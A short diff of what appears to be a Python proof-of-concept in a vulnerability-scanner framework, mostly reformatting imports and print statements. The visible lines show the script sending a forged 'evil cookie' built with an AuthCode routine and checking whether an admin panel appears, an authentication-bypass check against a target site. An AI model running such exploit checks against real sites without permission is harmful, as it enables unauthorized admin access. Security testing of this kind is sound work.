@@ -1,7 +1,9 @@
+from urllib import urlencode
+
+import requests
+
 from lib.core.data import target
 from lib.plugin.crypto.authcode import AuthCode
-from urllib import urlencode
-import requests
 
 
 def poc():
@@ -30,9 +32,10 @@ def poc():
         print("[*] The evil cookie : {}".format(cookie))
         text = requests.get(url, cookies=cookie).text
         if adminpanel in text:
-            print("[+] Confirm: The website( {} ) is vulnerable".format(target.url))
-
-        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
+            print("[+] Confirm: The website( {} ) is vulnerable".format(
+                target.url))
 
     except KeyError as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
